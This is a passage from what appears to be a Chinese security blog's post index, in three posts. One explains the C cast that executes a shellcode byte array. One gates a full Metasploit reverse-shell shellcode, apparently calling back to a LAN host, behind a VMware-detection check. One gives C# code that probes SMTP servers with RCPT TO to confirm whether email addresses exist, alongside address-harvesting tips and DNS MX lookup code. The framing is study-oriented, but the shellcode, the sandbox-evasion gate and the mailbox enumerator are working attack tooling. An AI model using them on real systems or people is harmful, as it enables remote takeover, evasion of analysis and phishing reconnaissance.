buf[] = \n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n...\n\"\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\";\n\nvoid main()\n{\n\t( (void(*)())&buf)();\n}\n```\n\n如果在VS2019下使用：\n\n```c\nmain()\n{\n\tMemory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tmemcpy(Memory, buf, sizeof(buf));\n\t((void(*)())Memory)();\n}\n```\n\n编译生成之后执行就会反弹shell，我们直接看VC++中的代码，因为VS2019中的可以看到也是一样的，核心的都是这一串代码：\n\n```c\n((void(*)())&buf)();\n```\n\n## 代码分析\n\n最开始看到这串代码的时候就决定看一下，网上搜索了一下发现在《C陷阱与缺陷》这本书的第2章\"理解函数声明\"中有很好的解释，在看之前先看一下指向数组的指针和指向函数的指针\n\n### 指针与数组\n\n例子：\n\n一个有5个成员的数组array，数组名为array，实际上此时array就是一个指针，指向的就是数组的第一个元素，往后+一位就指向第二个元素\n\n```c\nint array[5] = {1, 2, 3, 4, 5};\nprintf(\"%x\\n\",*(array+1));\n```\n\n### 指针与函数\n\n先看几种类型的指针\n\n```c\nint f(); //一个函数名为f,返回类型为int的函数\nint *h(); //h是一个返回值为\"指向int类型的指针\"的函数\nint (*h)(); //h是一个指向一个函数的指针，这个函数的返回值为int类型\n```\n\n理解了上面的几种类型的指针之后再看源码，首先把上面的int改为void\n\n```c\nvoid (*h)(); \n```\n\n这里h是一个指向一个函数的指针，这个函数的返回值为空，再改动一下：\n\n```c\n(void (*)())\n```\n\n在外面加一层括号之后，表示\"一个指向返回值为空的函数的指针\"的类型转换符，知道这一点之后就好理解了\n\n```c\n(void (*)()) //类型转换符\n(void (*)())&buf //将&buf的类型转换为一个函数指针，这个函数返回值为空\n((void (*)())&buf)(); //一个函数，这个函数的地址为&buf\n```\n\n### buf和&buf的区别\n\n这里最开始以为可以用buf，发现执行会报错，然后将两个都printf出来发现两个值是一样的\n\n![image-20200819215314722](C_ShellCode执行时的指针问题.assets/image-20200819215314722.png)\n\n然后使用typeid打印出buf和&buf的类型发现是不一样的\n\n```c\nprintf(\"%s\\n\", typeid(buf).name());\nprintf(\"%s\\n\", typeid(&buf).name());\n```\n\n![image-20200819215536601](C_ShellCode执行时的指针问题.assets/image-20200819215536601.png)\n\nbuf相当于数组第一个元素的地址，相当于&buf[0]，而&buf表示一个地址的首地址，是一个地址常量，所以在转换的时候不会报错\n\n","categories":["二进制相关"]},{"title":"C_Anti-VM的小测试","url":"/2020/12-18-C_Anti-VM的小测试/","content":"\n本文中的代码是博文反虚拟化技术文章中的一小段测试代码，使用了下面几个Win32的API，目的是为了练习API的使用\n\n```\nSetupDiGetClassDevs\nSetupDiEnumDeviceInfo\nSetupDiGetDeviceRegistryProperty\nSetupDiDestroyDeviceInfoList\n```\n\n代码中buf是反弹到MSF的shellcode，如果当前环境为VMWare则不执行，如果不是则执行代码反弹shell\n\n源码如下（完整的项目文件https://github.com/SeikoSrp/AntiVM）：\n\n```c++\n#include <windows.h>\n#include <setupapi.h>\n#include <stdio.h>\n#include <string>\n#include <regex>\n#include <iostream>\n\n#pragma comment(lib,\"Dbghelp.lib\")\nusing namespace std;\n\nunsigned char buf[] =\n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n\"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\"\n\"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\"\n\"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\"\n\"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\"\n\"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\"\n\"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\"\n\"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\"\n\"\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\"\n\"\\x77\\x26\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\"\n\"\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\xfe\\x82\"\n\"\\x68\\x02\\x00\\x11\\x5c\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\"\n\"\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"\n\"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\"\n\"\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\"\n\"\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\"\n\"\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\"\n\"\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\"\n\"\\x68\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\"\n\"\\x57\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\"\n\"\\x70\\xff\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\"\n\"\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\";\n\nBOOL findVmwareString\n(\n    __in HDEVINFO        hDevInfo,\n    __in SP_DEVINFO_DATA DeviceInfoData,\n    __in DWORD           Property\n)\n{\n    DWORD  DataT;\n    LPTSTR buffer = NULL;\n    DWORD  buffersize = 0;\n    // 3、检索指定的即插即用设备属性\n    while (!SetupDiGetDeviceRegistryProperty(\n        hDevInfo,\n        &DeviceInfoData,\n        Property,\n        &DataT,\n        (PBYTE)buffer,//接收属性\n        buffersize,\n        &buffersize))\n    {\n        if (ERROR_INSUFFICIENT_BUFFER == GetLastError())\n        {\n            if (buffer)\n            {\n                LocalFree(buffer);\n            }\n            buffer = (LPTSTR)LocalAlloc(LPTR, buffersize * 2);\n        }\n        else\n        {\n            break;\n        }\n    }\n    //wprintf(L\" %s\\n\", (PCSTR)buffer);\n\n    int match_vm = 0;\n    if (buffer)\n    {\n        TCHAR* first = buffer;\n        TCHAR* last = first + lstrlen(buffer);\n        //指定匹配细节\n        regex_constants::match_flag_type fl = regex_constants::match_default;\n        regex rx(\"VMware\");// Virtual S SCSI Disk Device\");\n        match_vm = regex_search(first, last, rx, fl);\n    }\n    \n    if (match_vm)\n    {\n        return TRUE;\n    }\n    else\n    {\n        return FALSE;\n    }\n    if (buffer)\n    {\n        LocalFree(buffer);\n    }\n}\n\nint main()\n{\n    HDEVINFO hDevInfo;\n    SP_DEVINFO_DATA DeviceInfoData;\n    DWORD i;\n    BOOL isvmware = FALSE;\n\n    // 1、获取设备信息集，返回设备信息集的句柄\n    hDevInfo = SetupDiGetClassDevs(\n        NULL,\n        0, // Enumerator\n        0,\n        DIGCF_PRESENT | DIGCF_ALLCLASSES);\n\n    if (INVALID_HANDLE_VALUE == hDevInfo)\n    {\n        // Insert error handling here.\n        return 1;\n    }\n\n    // Enumerate through all devices in Set.\n\n    DeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);\n    i = 0;\n    // 2、通过设备信息集句柄获取设备信息集的信息元素，&DeviceInfoData指针用来接收元素内容，成功返回ture\n    while ( SetupDiEnumDeviceInfo(hDevInfo, i, &DeviceInfoData))\n    {\n        i++;\n        LPTSTR buffer = NULL;\n        DWORD  buffersize = 0;\n\n        if (findVmwareString(hDevInfo, DeviceInfoData, SPDRP_FRIENDLYNAME))\n        {\n            isvmware = TRUE;\n        }\n    }\n    SetupDiDestroyDeviceInfoList(hDevInfo);\n    printf(\"%d\\n\", isvmware);\n    if (isvmware)\n    {\n        printf(\"vmware\\n\");\n        return 0;\n    }\n    else\n    {\n        //printf(\"not vmware\\n\");\n        //LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        //memcpy(Memory, buf, sizeof(buf));\n        //((void(*)())Memory)();\n        return 1;\n    }\n\n    if (NO_ERROR != GetLastError() && ERROR_NO_MORE_ITEMS != GetLastError())\n    {\n        return 1;\n    }\n    return 0;\n}\n```\n\n","categories":["二进制相关"]},{"title":"CSharp判断邮箱是否存在","url":"/2020/12-18-CSharp判断邮箱是否存在/","content":"# 收集邮箱地址\n\n这里推荐一个网站收集的地址，收集的数量很多，但是是要收费的：\n\nhttps://hunter.io\n\n![image-20201207122528622](CSharp判断邮箱是否存在.assets/image-20201207122528622.png)\n\n还有一些猜测邮箱的方式：\n\nhttps://www.52by.com/article/20980\n\n# C#验证邮箱\n\n## 原理\n\n这里主要通过`RCPT TO`消息之后的返回值来判断，如果存在则返回250，不存在则返回550\n\nhttp://www.ruanyifeng.com/blog/2017/06/smtp-protocol.html\n\nhttps://docs.microsoft.com/en-us/exchange/mail-flow/test-smtp-with-telnet?view=exchserver-2019\n\n```bash\nubuntu@VM-0-9-ubuntu:~$ telnet \ntelnet> OPEN mx.test.com 25\nTrying x.x.x.x...\nConnected to mx.test.com.\nEscape character is '^]'.\n220 mx5.test.com ESMTP\nEHLO contoso.com\n250-mx5.test.com\n250-8BITMIME\n250 SIZE 20971520\nMAIL FROM: <chris@contoso.com>\n250 sender <chris@contoso.com> ok\nRCPT TO: <test@test.com>\n550 #5.1.0 Address rejected.\n\n#成功则返回：\nRCPT TO: <test@test.com>\n250 recipient <test@test.com> ok\n```\n\n## 实现代码\n\n上面的这是在telnet下面的一个完整的验证过程，下面是C#的实现：\n\n```c#\nusing System;\nusing System.Net;\nusing System.Net.Sockets;\nusing System.Text;\nusing System.Text.RegularExpressions;\n\nnamespace ConsoleApp1\n{\n    class Program\n    {\n        public static string DomainToIp(string domain)\n        {\n            domain = domain.Replace(\"http://\", \"\").Replace(\"https://\", \"\");\n            IPHostEntry hostEntry = Dns.GetHostEntry(domain);\n            IPEndPoint ipEndPoint = new IPEndPoint(hostEntry.AddressList[0], 0);\n            //Console.WriteLine(ipEndPoint.Address.ToString());\n            return ipEndPoint.Address.ToString();\n\n        }\n\n        private bool CheckEmail(string EmailAddr, string SmtpServer)\n        {\n            try\n            {\n                int port = 25;\n                ///创建终结点EndPoint\n                IPAddress ip = IPAddress.Parse(DomainToIp(SmtpServer));\n                //IPAddress ipp = new IPAddress(\"127.0.0.1\");\n                IPEndPoint ipe = new IPEndPoint(ip, port);//把ip和端口转化为IPEndpoint实例\n\n                //创建socket并连接到服务器\n                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);//创建Socket\n                socket.Connect(ipe);\n\n                string[] sendStr = new string[3];\n                sendStr[0] = \"EHLO contoso.com\\r\\n\";\n                sendStr[1] = \"MAIL FROM: <chris@contoso.com>\\r\\n\";\n                sendStr[2] = \"RCPT TO:<\" + EmailAddr + \">\\r\\n\";\n\n                //--------------------------------------------------------------------------------------------------\n                string recvStr = \"\";\n                byte[] recvBytes = new byte[1024];\n                recvStr += Encoding.ASCII.GetString(recvBytes, 0, socket.Receive(recvBytes, recvBytes.Length, 0));\n                //Console.WriteLine(\"First: \"+ recvStr);\n                if (Regex.Matches(recvStr, @\"^220\").Count == 1)\n                {\n                    recvStr = \"\";\n                    //byte[] recvBytes1 = new byte[1024];\n                    socket.Send(Encoding.ASCII.GetBytes(sendStr[0]), Encoding.ASCII.GetBytes(sendStr[0]).Length, 0);//EHLO contoso.com\n                    //Console.WriteLine(\"EHLO : \" + sendStr[0]);\n                    recvStr += Encoding.ASCII.GetString(recvBytes, 0, socket.Receive(recvBytes, recvBytes.Length, 0));\n                    //Console.WriteLine(\"EHLO : \" + recvStr + \"\\r\\n\");\n                }\n\n                //--------------------------------------------------------------------------------------------------\n                if(Regex.Matches(recvStr, @\"^250\").Count == 1)\n                {\n                    //MAIL FROM\n                    socket.Send(Encoding.ASCII.GetBytes(sendStr[1]), Encoding.ASCII.GetBytes(sendStr[1]).Length, 0);\n                    //Console.WriteLine(\"MAIL FROM : \" + sendStr[1]);\n                }\n                recvStr = \"\";\n                recvStr += Encoding.ASCII.GetString(recvBytes, 0, socket.Receive(recvBytes, recvBytes.Length, 0));\n                //Console.WriteLine(\"MAIL FROM : \" + recvStr + \"\\r\\n\");\n                //--------------------------------------------------------------------------------------------------\n\n                if (Regex.Matches(recvStr, @\"^250\").Count == 1)\n                {\n                    //RCPT TO\n                    socket.Send(Encoding.ASCII.GetBytes(sendStr[2]), Encoding.ASCII.GetBytes(sendStr[2]).Length, 0);\n                    //Console.WriteLine(sendStr[2]+\"\\r\\n\");\n                }\n                recvStr = \"\";\n                recvStr += Encoding.ASCII.GetString(recvBytes, 0, socket.Receive(recvBytes, recvBytes.Length, 0));\n                //Console.WriteLine(recvStr + \"\\r\\n\");\n                socket.Close();\n                if (Regex.Matches(recvStr, @\"^250\").Count == 1) { return true; } else { return false; }\n                \n            }\n            catch (SocketException e)\n            {\n                Console.WriteLine(\"SocketException:{0}\", e);\n            }\n            Console.WriteLine(\"Press Enter to Exit\");\n            return false;\n\n        }\n        static void Main(string[] args)\n        {\n            string mailaddr = \"seido@test.com\";\n            Program program =  new Program();\n            bool result = program.CheckEmail(mailaddr, \"mx2.test.com\");\n            if(result)\n            {\n                Console.WriteLine(\"邮箱存在\");\n            }\n            Console.ReadLine();\n        }\n    }\n}\n```\n\n# 查询域名的DNS记录\n\n上面的代码需要指定邮件服务器的地址，所以需要解析邮箱的域名，找到邮箱的邮件服务器地址\n\n分为A记录，邮箱记录等等，所以拿到一个域名需要查询MX记录才能确定把邮件发到那个服务器上\n\nhttps://zh.wikipedia.org/zh/MX%E8%AE%B0%E5%BD%95\n\n另外.NET中没有看到提供能够查询一个域名的MX记录的方法，所以这里是直接使用了网上的一个代码：\n\nhttps://github.com/xiangyuecn/DNS-csharp\n\n这里实现了查询所有类型的DNS记录：\n\n```C#\nusing System;\nusing System.Collections;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Net;\nusing System.Runtime.InteropServices;\nusing System.Text;\nusing System.Text.RegularExpressions;\n\nnamespace ConsoleApp1\n{\n\tpublic class DNS_A : DNSBase\n\t{\n\t\t[StructLayout(LayoutKind.Sequential)]\n\t\tprivate class A : Record\n\t\t{\n\t\t\t//https://docs.microsoft.com/zh-cn/windows/desktop/api/windns/ns-windns-__unnamed_struct_2\n\t\t\tpublic uint IpAddress;\n\t\t}\n\n\t\tprotected override Type RecordType { get { return typeof(A); } }\n\t\tprotected override string GetVal(object obj)\n\t\t{\n\t\t\treturn new IPAddress(((A)obj).IpAddress).ToString();\n\t\t}\n\t}\n\tpublic class DNS_MX : DNSBase\n\t{\n\t\t[StructLayout(LayoutKind.Sequential)]\n\t\tprivate class MX : Record\n\t\t{\n\t\t\tpublic IntPtr pNameExchange;\n\t\t\tpublic short wPreference;\n\t\t\tpublic short Pad;\n\t\t}\n\n\t\tprotected override Type RecordType { get { return typeof(MX); } }\n\t\tprotected override string GetVal(object obj)\n\t\t{\n\t\t\treturn Marshal.PtrToStringUni(((MX)obj).pNameExchange);\n\t\t}\n\t}\n\tpublic class DNS_CNAME : DNSBase\n\t{\n\t\t[StructLayout(LayoutKind.Sequential)]\n\t\tprivate class CNAME : Record\n\t\t{\n\t\t\tpublic IntPtr pNameHost;\n\t\t}\n\n\t\tprotected override Type RecordType { get { return typeof(CNAME); } }\n\t\tprotected override string GetVal(object obj)\n\t\t{\n\t\t\treturn Marshal.PtrToStringUni(((CNAME)obj).pNameHost);\n\t\t}\n\t}\n\tpublic class DNS_NS : DNSBase\n\t{\n\t\t[StructLayout(LayoutKind.Sequential)]\n\t\tprivate class NS : Record\n\t\t{\n\t\t\tpublic IntPtr pNameHost;\n\t\t}\n\n\t\tprotected override Type RecordType { get { return typeof(NS); } }\n\t\tprotected override string GetVal(object obj)\n\t\t{\n\t\t\treturn Marshal.PtrToStringUni(((NS)obj).pNameHost);\n\t\t}\n\t}\n\tpublic class DNS_PTR : DNSBase\n\t{\n\t\t[StructLayout(LayoutKind.Sequential)]\n\t\tprivate class PTR : Record\n\t\t{\n\t\t\tpublic IntPtr pNameHost;\n\t\t}\n\n\t\tprotected override Type RecordType { get { return typeof(PTR); } }\n\t\tprotected override string GetVal(object obj)\n\t\t{\n\t\t\treturn Marshal.PtrToStringUni(((PTR)obj).pNameHost);\n\t\t}\n\t\tstatic private Regex exp = new Regex(@\"^(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)$\");\n\t\tprotected override Result<string> TransformDomain(string domain)\n\t\t{\n\t\t\tvar m = exp.Match(domain);\n\t\t\tif (m.Success)\n\t\t\t{\n\t\t\t\tdomain = m.Groups[4].Value\n\t\t\t\t\t+ \".\" + m.Groups[3].Value\n\t\t\t\t\t+ \".\" + m.Groups[2].Value\n\t\t\t\t\t+ \".\" + m.Groups[1].Value\n\t\t\t\t\t+ \".in-addr.arpa\";\n\t\t\t}\n\n\t\t\treturn base.TransformDomain(domain);\n\t\t}\n\t}\n\tpublic class DNS_TXT : DNSBase\n\t{\n\t\t[StructLayout(LayoutKind.Sequential)]\n\t\tprivate class TXT : Record\n\t\t{\n\t\t\tpublic uint dwStringCount;\n\t\t\tpublic IntPtr pStringArray;\n\t\t}\n\n\t\tprotected override Type RecordType { get { return typeof(TXT); } }\n\t\tprotected override string GetVal(object obj)\n\t\t{\n\t\t\treturn Marshal.PtrToStringUni(((TXT)obj).pStringArray);\n\t\t}\n\t}\n\n\n\t[StructLayout(LayoutKind.Sequential)]\n\tpublic abstract class DNSBase\n\t{\n\t\tabstract protected Type RecordType { get; }\n\t\tabstract protected string GetVal(object obj);\n\t\t/// <summary>\n\t\t/// 如果此查询需要对域名进行特殊处理，就处理一下\n\t\t/// </summary>\n\t\tprotected virtual Result<string> TransformDomain(string domain)\n\t\t{\n\t\t\tvar rtv = new Result<string>();\n\t\t\trtv.Value = domain;\n\t\t\treturn rtv;\n\t\t}\n\n\t\tstatic private Dictionary<string, int> Types = new Dictionary<string, int>();\n\t\t/// <summary>\n\t\t/// 注册一个类型，比如A,0x1，类型参考https://docs.microsoft.com/zh-cn/windows/desktop/DNS/dns-constants中的DNS Record Types\n\t\t/// </summary>\n\t\tstatic public void RegisterType(string type, int value)\n\t\t{\n\t\t\tTypes[type] = value;\n\t\t}\n\t\tstatic DNSBase()\n\t\t{\n\t\t\tRegisterType(\"A\", 0x0001);\n\t\t\tRegisterType(\"MX\", 0x000f);\n\t\t\tRegisterType(\"CNAME\", 0x0005);\n\t\t\tRegisterType(\"NS\", 0x0002);\n\t\t\tRegisterType(\"PTR\", 0x000c);\n\t\t\tRegisterType(\"TXT\", 0x0010);\n\t\t}\n\n\n\t\t/// <summary>\n\t\t/// 查询一条记录，如果没有记录或查询失败会返回原因\n\t\t/// </summary>\n\t\tpublic Result<string> QueryOne(string domain, DNSQueryOptions options = DNSQueryOptions.STANDARD)\n\t\t{\n\t\t\tvar rtv = new Result<string>();\n\t\t\tvar res = QueryAll(domain, options);\n\t\t\tif (res.IsError)\n\t\t\t{\n\t\t\t\tres.errorTo(rtv);\n\t\t\t\treturn rtv;\n\t\t\t}\n\t\t\tvar val = res.Value;\n\t\t\tif (val.Count == 0)\n\t\t\t{\n\t\t\t\trtv.error(\"未查询到\" + RecordType.Name + \"记录\");\n\t\t\t\treturn rtv;\n\t\t\t}\n\n\t\t\trtv.Value = val[0];\n\t\t\treturn rtv;\n\t\t}\n\t\t/// <summary>\n\t\t/// 查询此类型的记录列表，如果查询失败会返回原因\n\t\t/// </summary>\n\t\tpublic Result<List<string>> QueryAll(string domain, DNSQueryOptions options = DNSQueryOptions.STANDARD)\n\t\t{\n\t\t\tvar rtv = new Result<List<string>>();\n\t\t\tList<string> list = new List<string>();\n\t\t\trtv.Value = list;\n\n\t\t\tif (String.IsNullOrEmpty(domain))\n\t\t\t{\n\t\t\t\trtv.error(\"查询\" + RecordType.Name + \"记录域名不能为空\");\n\t\t\t\treturn rtv;\n\t\t\t}\n\t\t\ttry\n\t\t\t{\n\t\t\t\tvar tdRes = TransformDomain(domain);\n\t\t\t\tif (tdRes.IsError)\n\t\t\t\t{\n\t\t\t\t\ttdRes.errorTo(rtv);\n\t\t\t\t\treturn rtv;\n\t\t\t\t}\n\t\t\t\tdomain = tdRes.Value;\n\n\t\t\t\tIntPtr ptr1 = IntPtr.Zero;\n\t\t\t\tIntPtr ptr2 = IntPtr.Zero;\n\t\t\t\tRecord rec;\n\n\t\t\t\tvar type = Types[RecordType.Name];\n\t\t\t\tint num = DnsQuery(ref domain, type, options, 0, ref ptr1, 0);\n\t\t\t\tif (num != 0)\n\t\t\t\t{\n\t\t\t\t\trtv.error(\"查询出错[\" + num + \"]\");\n\t\t\t\t\treturn rtv;\n\t\t\t\t}\n\t\t\t\tfor (ptr2 = ptr1; !ptr2.Equals(IntPtr.Zero); ptr2 = rec.pNext)\n\t\t\t\t{\n\t\t\t\t\trec = (Record)Marshal.PtrToStructure(ptr2, RecordType);\n\t\t\t\t\tif (rec.wType == type)\n\t\t\t\t\t{\n\t\t\t\t\t\tlist.Add(GetVal(rec));\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tDnsRecordListFree(ptr1, 0);\n\t\t\t\treturn rtv;\n\t\t\t}\n\t\t\tcatch (Exception e)\n\t\t\t{\n\t\t\t\trtv.fail(\"查询\" + RecordType.Name + \"记录出错：\" + e.Message, e.ToString());\n\t\t\t\treturn rtv;\n\t\t\t}\n\t\t}\n\t\t[DllImport(\"dnsapi\", EntryPoint = \"DnsQuery_W\", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)]\n\t\tprivate static extern int DnsQuery([MarshalAs(UnmanagedType.VBByRefStr)] ref string pszName, int wType, DNSQueryOptions options, int aipServers, ref IntPtr ppQueryResults, int pReserved);\n\n\t\t[DllImport(\"dnsapi\", CharSet = CharSet.Auto, SetLastError = true)]\n\t\tprivate static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);\n\n\n\t\t[StructLayout(LayoutKind.Sequential)]\n\t\tprotected abstract class Record\n\t\t{\n\t\t\t//https://docs.microsoft.com/zh-cn/windows/desktop/api/windns/ns-windns-_dnsrecorda 固定数据\n\t\t\tpublic IntPtr pNext;\n\t\t\tpublic IntPtr pName;\n\t\t\tpublic short wType;\n\t\t\tpublic short wDataLength;\n\t\t\tpublic int flags;\n\t\t\tpublic int dwTtl;\n\t\t\tpublic int dwReserved;\n\t\t}\n\t}\n\n\n\t//https://docs.microsoft.com/zh-cn/windows/desktop/DNS/dns-constants\n\tpublic enum DNSQueryOptions\n\t{\n\t\tSTANDARD = 0x00000000,\n\t\tACCEPT_TRUNCATED_RESPONSE = 0x00000001,\n\t\tUSE_TCP_ONLY = 0x00000002,\n\t\tNO_RECURSION = 0x00000004,\n\t\tBYPASS_CACHE = 0x00000008,\n\t\tNO_WIRE_QUERY = 0x00000010,\n\t\tNO_LOCAL_NAME = 0x00000020,\n\t\tNO_HOSTS_FILE = 0x00000040,\n\t\tNO_NETBT = 0x00000080,\n\t\tWIRE_ONLY = 0x00000100,\n\t\tRETURN_MESSAGE = 0x00000200,\n\t\tMULTICAST_ONLY = 0x00000400,\n\t\tNO_MULTICAST = 0x00000800,\n\t\tTREAT_AS_FQDN = 0x00001000,\n\t\tADDRCONFIG = 0x00002000,\n\t\tDUAL_ADDR = 0x00004000,\n\t\tMULTICAST_WAIT = 0x00020000,\n\t\tMULTICAST_VERIFY = 0x00040000,\n\t\tDONT_RESET_TTL_VALUES = 0x00100000,\n\t\tDISABLE_IDN_ENCODING = 0x00200000,\n\t\tAPPEND_MULTILABEL = 0x00800000\n\t\t//RESERVED = 0xf0000000\n\t}\n\tpublic static class Extensions\n\t{\n\t\t/// <summary>\n\t\t/// 用join字符串拼接数组内元素,list[0]+join+list[1]...\n\t\t/// getFn:返回格式化后的字符串，比如\"aa\"，返回null不拼接此字符串\n\t\t/// </summary>\n\t\tstatic public string join(this IEnumerable list, string join, Func<object, string> getFn = null)\n\t\t{\n\t\t\tStringBuilder str = new StringBuilder();\n\t\t\tbool start = false;\n\t\t\tforeach (object o in list)\n\t\t\t{\n\t\t\t\tif (getFn != null)\n\t\t\t\t{\n\t\t\t\t\tstring val = getFn(o);\n\t\t\t\t\tif (val != null)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (start)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstr.Append(join);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tstr.Append(val);\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tif (start)\n\t\t\t\t\t{\n\t\t\t\t\t\tstr.Append(join);\n\t\t\t\t\t}\n\t\t\t\t\tstr.Append(o);\n\t\t\t\t}\n\t\t\t\tstart = true;\n\t\t\t}\n\t\t\treturn str.ToString();\n\t\t}\n\t}\n\n\tpublic class Result : IResult<object>\n\t{\n\n\t}\n\tpublic class Result<T> : IResult<T>\n\t{\n\n\t}\n\tpublic abstract class IResult<T>\n\t{\n\t\tpublic Dictionary<string, object> Json { get { return json; } }\n\t\tprotected Dictionary<string, object> json;\n\t\tpublic IResult()\n\t\t{\n\t\t\tjson = new Dictionary<string, object>();\n\n\t\t\tErrorMessage = \"\";\n\t\t\tServerErrorMessage = \"\";\n\t\t}\n\n\t\tprotected bool isErr = false;\n\t\tprotected bool isSevErr = false;\n\t\tpublic string ErrorMessage { get; set; }\n\t\tpublic string ServerErrorMessage { get; set; }\n\t\tpublic T Value\n\t\t{\n\t\t\tget\n\t\t\t{\n\t\t\t\tobject val;\n\t\t\t\tjson.TryGetValue(\"v\", out val);\n\t\t\t\treturn val == null ? default(T) : (T)val;\n\t\t\t}\n\t\t\tset\n\t\t\t{\n\t\t\t\tjson[\"v\"] = value;\n\t\t\t}\n\t\t}\n\n\t\tpublic IResult<T> buildResult()\n\t\t{\n\t\t\tjson[\"c\"] = isErr ? 1 : 0;\n\t\t\tjson[\"m\"] = ErrorMessage;\n\t\t\tif (isSevErr)\n\t\t\t{\n\t\t\t\tjson[\"m_sev\"] = ServerErrorMessage;\n\t\t\t}\n\n\t\t\treturn this;\n\t\t}\n\t\t/// <summary>\n\t\t/// 运行过程中是否出现错误，如果出错后续业务不应该被执行\n\t\t/// </summary>\n\t\tpublic bool IsError\n\t\t{\n\t\t\tget { return isErr; }\n\t\t}\n\t\t/// <summary>\n\t\t/// 运行异常，比如无法处理的捕获异常\n\t\t/// </summary>\n\t\t/// <param name=\"message\">用户提示</param>\n\t\t/// <param name=\"serverMessage\">服务器错误详细信息</param>\n\t\tpublic void fail(string message, string serverMessage)\n\t\t{\n\t\t\tisSevErr = true;\n\t\t\tServerErrorMessage = serverMessage;\n\t\t\terror(message);\n\t\t}\n\t\t/// <summary>\n\t\t/// 出现错误，给用户友好提示\n\t\t/// </summary>\n\t\t/// <param name=\"message\">用户提示</param>\n\t\tpublic void error(string message)\n\t\t{\n\t\t\tisErr = true;\n\t\t\tErrorMessage = message;\n\t\t}\n\n\t\t/// <summary>\n\t\t/// 把错误信息设置到另外一个对象，包括服务器错误，如果result已经有错将不会复制，新的错误会添加到现有错误前面\n\t\t/// </summary>\n\t\tpublic void errorTo<X>(IResult<X> result, string newErr = \"\", string newSrvErr = \"\")\n\t\t{\n\t\t\tif (result.isErr || !isErr)\n\t\t\t{\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tvar err = String.IsNullOrEmpty(newErr) ? \"\" : newErr + \"\\nby\\n\";\n\t\t\terr += ErrorMessage;\n\t\t\tvar srvErr = String.IsNullOrEmpty(newErr) ? \"\" : newSrvErr + \"\\nby\\n\";\n\n\t\t\tif (isSevErr || srvErr != \"\")\n\t\t\t{\n\t\t\t\tsrvErr += ServerErrorMessage;\n\n\t\t\t\tresult.fail(err, 